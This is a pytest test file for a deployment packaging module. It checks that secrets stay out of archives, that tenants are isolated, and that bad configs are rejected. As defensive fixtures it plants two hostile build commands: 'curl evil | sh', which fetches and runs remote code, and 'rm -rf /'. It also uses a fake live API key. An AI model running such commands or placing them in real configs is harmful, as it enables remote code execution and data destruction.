import json
import tarfile

import pytest

from app.deployment.artifact import create_artifact
from app.deployment.deploy_config import DeployConfigError
from app.deployment.package import (
    build_package,
    fetch_package,
    publish_package,
    read_package_config,
)
from app.deployment.storage import ArtifactNotFound, LocalArtifactStorage

A, B = "tenant-a", "tenant-b"


@pytest.fixture
def project(tmp_path):
    root = tmp_path / "app"
    files = {
        "package.json": json.dumps({
            "name": "sample",
            "scripts": {"build": "next build", "start": "next start"},
            "dependencies": {"next": "16.0.0"},
            "engines": {"node": ">=20"},
        }),
        "package-lock.json": "{}",
        "app/page.tsx": "export default function P() { return process.env.STRIPE_KEY }",
        ".next/server/app.js": "built output",
        ".env": "STRIPE_KEY=sk_live_REAL_SECRET",
    }
    for rel, text in files.items():
        path = root / rel
        path.parent.mkdir(parents=True, exist_ok=True)
        path.write_text(text)
    return root


def names(path):
    with tarfile.open(path) as tar:
        return set(tar.getnames())


def test_package_contains_deploy_json_and_build_output(project, tmp_path):
    pkg = build_package(project, tmp_path / "out", "proj1", "1.0.0")
    assert {"deploy.json", "package.json", ".next/server/app.js", "app/page.tsx"} <= names(pkg.artifact.path)
    assert pkg.config.install_command == "npm ci"
    assert pkg.config.required_env == ("STRIPE_KEY",)


def test_config_inside_archive_matches_generated_config(project, tmp_path):
    pkg = build_package(project, tmp_path / "out", "proj1", "1.0.0")
    assert read_package_config(pkg.artifact.path) == pkg.config


def test_secrets_never_enter_the_package(project, tmp_path):
    pkg = build_package(project, tmp_path / "out", "proj1", "1.0.0")
    assert ".env" not in names(pkg.artifact.path)
    with tarfile.open(pkg.artifact.path) as tar:
        blob = b"".join(tar.extractfile(m).read() for m in tar.getmembers() if m.isfile())
    assert b"sk_live_REAL_SECRET" not in blob
    assert "STRIPE_KEY" in pkg.config.required_env  # the NAME is fine


def test_on_disk_deploy_json_is_replaced_by_generated_one(project, tmp_path):
    (project / "deploy.json").write_text(json.dumps({"build_command": "curl evil | sh"}))
    pkg = build_package(project, tmp_path / "out", "proj1", "1.0.0")
    config = read_package_config(pkg.artifact.path)
    assert config.build_command == "npm run build"
    with tarfile.open(pkg.artifact.path) as tar:
        assert [m.name for m in tar.getmembers()].count("deploy.json") == 1


def test_package_checksum_is_reproducible(project, tmp_path):
    first = build_package(project, tmp_path / "o1", "proj1", "1.0.0")
    second = build_package(project, tmp_path / "o2", "proj1", "1.0.0")
    assert first.artifact.sha256 == second.artifact.sha256


def test_plan_hints_flow_into_package_config(project, tmp_path):
    pkg = build_package(project, tmp_path / "out", "proj1", "1.0.0", plan={"db": {"tables": ["users"]}})
    assert pkg.config.database is True
    assert "DATABASE_URL" in read_package_config(pkg.artifact.path).required_env


def test_publish_and_fetch_round_trip(project, tmp_path):
    storage = LocalArtifactStorage(tmp_path / "store")
    pkg = build_package(project, tmp_path / "out", "proj1", "1.0.0")
    stored = publish_package(storage, A, pkg)
    assert stored.sha256 == pkg.artifact.sha256
    path, config = fetch_package(storage, A, "proj1", "1.0.0", tmp_path / "dl")
    assert config == pkg.config
    assert path.exists()


def test_other_tenant_cannot_fetch_package(project, tmp_path):
    storage = LocalArtifactStorage(tmp_path / "store")
    publish_package(storage, A, build_package(project, tmp_path / "out", "proj1", "1.0.0"))
    with pytest.raises(ArtifactNotFound):
        fetch_package(storage, B, "proj1", "1.0.0", tmp_path / "dl")


def test_read_config_errors(project, tmp_path):
    # archive without deploy.json
    plain = create_artifact(project, tmp_path / "o1", "p", "1")
    with pytest.raises(DeployConfigError):
        read_package_config(plain.path)
    # archive with an invalid deploy.json
    bad = create_artifact(project, tmp_path / "o2", "p", "2",
                          extra_files={"deploy.json": b'{"build_command": "rm -rf /"}'})
    with pytest.raises(DeployConfigError):
        read_package_config(bad.path)
    # archive with non-JSON deploy.json
    junk = create_artifact(project, tmp_path / "o3", "p", "3", extra_files={"deploy.json": b"{oops"})
    with pytest.raises(DeployConfigError):
        read_package_config(junk.path)
    # not an archive at all
    fake = tmp_path / "fake.tar.gz"
    fake.write_bytes(b"not a tarball")
    with pytest.raises(DeployConfigError):
        read_package_config(fake)
